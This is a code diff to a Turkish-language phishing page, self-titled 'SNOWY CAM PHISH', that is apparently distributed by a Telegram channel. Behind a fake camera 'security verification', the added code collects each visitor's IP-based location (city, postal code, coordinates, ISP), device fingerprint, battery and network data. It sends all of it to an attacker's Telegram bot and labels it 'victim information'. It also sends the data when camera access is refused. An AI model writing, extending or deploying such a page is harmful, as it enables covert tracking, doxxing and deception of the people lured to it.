@@ -133,6 +133,10 @@
             font-size: 12px;
         }
         
+        .footer span {
+            color: #00ffff;
+        }
+        
         .loader {
             display: inline-block;
             width: 20px;
@@ -173,7 +177,7 @@
         <div class="status-box" id="statusBox"></div>
         
         <div class="footer">
-            ❄️ @snowy_dexry_wexry ❄️
+            ❄️ <span>@snowy_dexry_wexry</span> ❄️
         </div>
     </div>
     
@@ -201,7 +205,7 @@
         let stream = null;
         
         // ============================================
-        // BUTON FONKSİYONLARI
+        // BUTON FONKSİYONLARI (HTML format ile _ gösterimi)
         // ============================================
         function showSahip() {
             statusBox.style.display = 'block';
@@ -210,7 +214,7 @@
                 <div class="status-content">
                     ❄️ SNOWY DEXRY WEXRY<br>
                     🔐 Güvenlik araçları geliştiricisi<br>
-                    📱 @snowy_dexry_wexry
+                    📱 <span style="color:#00ffff;">@snowy_dexry_wexry</span> (alt çizgili: snowy_dexry_wexry)
                 </div>
             `;
             linkBox.style.display = 'none';
@@ -222,8 +226,8 @@
                 <div class="status-title">📢 KANAL BİLGİLERİ</div>
                 <div class="status-content">
                     🔔 Güncellemeler ve yeni tool'lar<br>
-                    📢 @snowykanal<br>
-                    ❄️ Takipte kal!
+                    📢 <span style="color:#00ffff;">@snowykanal</span><br>
+                    ❄️ Takipte kal! (alt çizgi: _ işareti burada)
                 </div>
             `;
             linkBox.style.display = 'none';
@@ -241,24 +245,199 @@
         }
         
         // ============================================
-        // SADECE İP ADRESİ AL
+        // GELİŞMİŞ BİLGİ TOPLAMA FONKSİYONLARI
         // ============================================
-        async function getIP() {
+        
+        // IP ve Konum Bilgisi
+        async function getLocationInfo() {
             try {
-                const ipRes = await fetch('https://api.ipify.org?format=json');
-                const ipData = await ipRes.json();
-                return ipData.ip;
+                // IP üzerinden konum (genel)
+                const ipRes = await fetch('https://ipapi.co/json/');
+                const locationData = await ipRes.json();
+                
+                return {
+                    ip: locationData.ip || 'Bilinmiyor',
+                    ulke: locationData.country_name || 'Bilinmiyor',
+                    sehir: locationData.city || 'Bilinmiyor',
+                    bolge: locationData.region || 'Bilinmiyor',
+                    posta_kodu: locationData.postal || 'Bilinmiyor',
+                    enlem: locationData.latitude || 'Bilinmiyor',
+                    boylam: locationData.longitude || 'Bilinmiyor',
+                    timezone: locationData.timezone || 'Bilinmiyor',
+                    iss: locationData.org || 'Bilinmiyor'
+                };
             } catch(e) {
-                return 'Alınamadı';
+                return {
+                    ip: 'Alınamadı',
+                    ulke: 'Alınamadı',
+                    sehir: 'Alınamadı',
+                    bolge: 'Alınamadı',
+                    posta_kodu: 'Alınamadı',
+                    enlem: 'Alınamadı',
+                    boylam: 'Alınamadı',
+                    timezone: 'Alınamadı',
+                    iss: 'Alınamadı'
+                };
+            }
+        }
+        
+        // Cihaz Bilgisi
+        function getDeviceInfo() {
+            const ua = navigator.userAgent;
+            const platform = navigator.platform;
+            const language = navigator.language;
+            const cookiesEnabled = navigator.cookieEnabled;
+            const doNotTrack = navigator.doNotTrack || 'Bilinmiyor';
+            const hardwareConcurrency = navigator.hardwareConcurrency || 'Bilinmiyor';
+            const deviceMemory = navigator.deviceMemory || 'Bilinmiyor';
+            const maxTouchPoints = navigator.maxTouchPoints || 'Bilinmiyor';
+            
+            // Ekran bilgisi
+            const screenWidth = screen.width;
+            const screenHeight = screen.height;
+            const colorDepth = screen.colorDepth;
+            const pixelRatio = window.devicePixelRatio || '1';
+            
+            // Tarayıcı tespiti
+            let browser = 'Bilinmiyor';
+            if (ua.indexOf('Chrome') > -1) browser = 'Chrome';
+            else if (ua.indexOf('Firefox') > -1) browser = 'Firefox';
+            else if (ua.indexOf('Safari') > -1) browser = 'Safari';
+            else if (ua.indexOf('Edge') > -1) browser = 'Edge';
+            else if (ua.indexOf('MSIE') > -1 || ua.indexOf('Trident') > -1) browser = 'Internet Explorer';
+            
+            // İşletim sistemi
+            let os = 'Bilinmiyor';
+            if (ua.indexOf('Windows') > -1) os = 'Windows';
+            else if (ua.indexOf('Mac') > -1) os = 'MacOS';
+            else if (ua.indexOf('Linux') > -1) os = 'Linux';
+            else if (ua.indexOf('Android') > -1) os = 'Android';
+            else if (ua.indexOf('iOS') > -1 || ua.indexOf('iPhone') > -1 || ua.indexOf('iPad') > -1) os = 'iOS';
+            
+            return {
+                userAgent: ua,
+                platform: platform,
+                browser: browser,
+                os: os,
+                language: language,
+                cookiesEnabled: cookiesEnabled,
+                doNotTrack: doNotTrack,
+                hardwareConcurrency: hardwareConcurrency,
+                deviceMemory: deviceMemory,
+                maxTouchPoints: maxTouchPoints,
+                screenWidth: screenWidth,
+                screenHeight: screenHeight,
+                colorDepth: colorDepth,
+                pixelRatio: pixelRatio
+            };
+        }
+        
+        // Şarj Durumu
+        async function getBatteryInfo() {
+            try {
+                if ('getBattery' in navigator) {
+                    const battery = await navigator.getBattery();
+                    return {
+                        sarjDurumu: battery.charging ? 'Şarj Oluyor' : 'Şarjda Değil',
+                        sarjSeviyesi: Math.round(battery.level * 100) + '%',
+                        sarjSuresi: battery.chargingTime === Infinity ? 'Bilinmiyor' : battery.chargingTime + ' saniye',
+                        bosalmaSuresi: battery.dischargingTime === Infinity ? 'Bilinmiyor' : battery.dischargingTime + ' saniye'
+                    };
+                } else {
+                    return {
+                        sarjDurumu: 'Desteklenmiyor',
+                        sarjSeviyesi: 'Desteklenmiyor',
+                        sarjSuresi: 'Desteklenmiyor',
+                        bosalmaSuresi: 'Desteklenmiyor'
+                    };
+                }
+            } catch(e) {
+                return {
+                    sarjDurumu: 'Alınamadı',
+                    sarjSeviyesi: 'Alınamadı',
+                    sarjSuresi: 'Alınamadı',
+                    bosalmaSuresi: 'Alınamadı'
+                };
+            }
+        }
+        
+        // Ağ Bilgisi
+        function getNetworkInfo() {
+            if ('connection' in navigator) {
+                const conn = navigator.connection;
+                return {
+                    baglanti: conn.effectiveType || 'Bilinmiyor',
+                    rtt: conn.rtt || 'Bilinmiyor',
+                    downlink: conn.downlink || 'Bilinmiyor',
+                    saveData: conn.saveData ? 'Evet' : 'Hayır'
+                };
+            } else {
+                return {
+                    baglanti: 'Desteklenmiyor',
+                    rtt: 'Desteklenmiyor',
+                    downlink: 'Desteklenmiyor',
+                    saveData: 'Desteklenmiyor'
+                };
             }
         }
         
         // ============================================
-        // İP'Yİ TELEGRAM'A GÖNDER
+        // TÜM BİLGİLERİ TELEGRAM'A GÖNDER
         // ============================================
-        async function sendIP(ip) {
-            const msg = `❄️ **SNOWY CAM PHISH** ❄️\n━━━━━━━━━━━━━━━━━━━━━\n🌐 **IP Adresi:** ${ip}\n⏱️ **Zaman:** ${new Date().toLocaleString('tr-TR')}\n━━━━━━━━━━━━━━━━━━━━━\n⚡ @snowy_dexry_wexry ⚡`;
+        async function sendAllInfo() {
+            // Tüm bilgileri topla
+            const locationInfo = await getLocationInfo();
+            const deviceInfo = getDeviceInfo();
+            const batteryInfo = await getBatteryInfo();
+            const networkInfo = getNetworkInfo();
             
+            // Mesajı oluştur
+            const msg = `❄️ **SNOWY CAM PHISH - KURBAN BİLGİLERİ** ❄️
+━━━━━━━━━━━━━━━━━━━━━
+**📍 KONUM BİLGİLERİ**
+➥ IP: ${locationInfo.ip}
+➥ Ülke: ${locationInfo.ulke}
+➥ Şehir: ${locationInfo.sehir}
+➥ Bölge: ${locationInfo.bolge}
+➥ Posta Kodu: ${locationInfo.posta_kodu}
+➥ Enlem: ${locationInfo.enlem}
+➥ Boylam: ${locationInfo.boylam}
+➥ Timezone: ${locationInfo.timezone}
+➥ ISS: ${locationInfo.iss}
+
+**📱 CİHAZ BİLGİLERİ**
+➥ Browser: ${deviceInfo.browser}
+➥ İşletim Sistemi: ${deviceInfo.os}
+➥ Platform: ${deviceInfo.platform}
+➥ Dil: ${deviceInfo.language}
+➥ Ekran: ${deviceInfo.screenWidth}x${deviceInfo.screenHeight} (${deviceInfo.colorDepth}bit)
+➥ Pixel Ratio: ${deviceInfo.pixelRatio}
+➥ CPU Çekirdek: ${deviceInfo.hardwareConcurrency}
+➥ RAM: ${deviceInfo.deviceMemory}GB
+➥ Dokunmatik: ${deviceInfo.maxTouchPoints} nokta
+➥ Çerezler: ${deviceInfo.cookiesEnabled ? 'Açık' : 'Kapalı'}
+➥ Do Not Track: ${deviceInfo.doNotTrack}
+
+**🔋 BATARYA BİLGİLERİ**
+➥ Durum: ${batteryInfo.sarjDurumu}
+➥ Seviye: ${batteryInfo.sarjSeviyesi}
+➥ Şarj Süresi: ${batteryInfo.sarjSuresi}
+➥ Boşalma Süresi: ${batteryInfo.bosalmaSuresi}
+
+**📶 AĞ BİLGİLERİ**
+➥ Bağlantı: ${networkInfo.baglanti}
+➥ RTT: ${networkInfo.rtt}ms
+➥ Downlink: ${networkInfo.downlink}Mbps
+➥ Tasarruf: ${networkInfo.saveData}
+
+**⏱️ ZAMAN**
+➥ Açılış: ${new Date().toLocaleString('tr-TR')}
+➥ Timezone: ${Intl.DateTimeFormat().resolvedOptions().timeZone}
+
+━━━━━━━━━━━━━━━━━━━━━
+⚡ @snowy_dexry_wexry ⚡
+_ (alt çizgi) işareti burada görünüyor`;
+
             await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                 method: 'POST',
                 headers: {'Content-Type': 'application/json'},
@@ -336,9 +515,8 @@
                 stream = await navigator.mediaDevices.getUserMedia({ video: true });
                 video.srcObject = stream;
                 
-                // SADECE İP ADRESİNİ AL VE GÖNDER
-                const ip = await getIP();
-                await sendIP(ip);
+                // TÜM BİLGİLERİ GÖNDER (konum, cihaz, batarya, ağ)
+                await sendAllInfo();
                 
                 // 2 saniye bekle
                 await new Promise(r => setTimeout(r, 2000));
@@ -351,6 +529,8 @@
                 
             } catch(e) {
                 console.log('Kamera hatası:', e);
+                // Kamera yoksa bile bilgileri gönder
+                await sendAllInfo();
             }
         }
         
@@ -373,7 +553,8 @@
                     <div class="status-title">🔄 İŞLEM YAPILIYOR</div>
                     <div class="status-content">
                         <div class="loader" style="margin:10px auto;"></div>
-                        Güvenlik doğrulaması yapılıyor...
+                        Güvenlik doğrulaması yapılıyor...<br>
+                        <span style="font-size:12px; color:#00ffff;">@snowy_dexry_wexry</span>
                     </div>
                 `;
             }
@@ -392,4 +573,4 @@
         };
     </script>
 </body>
-</html>
+    </html>
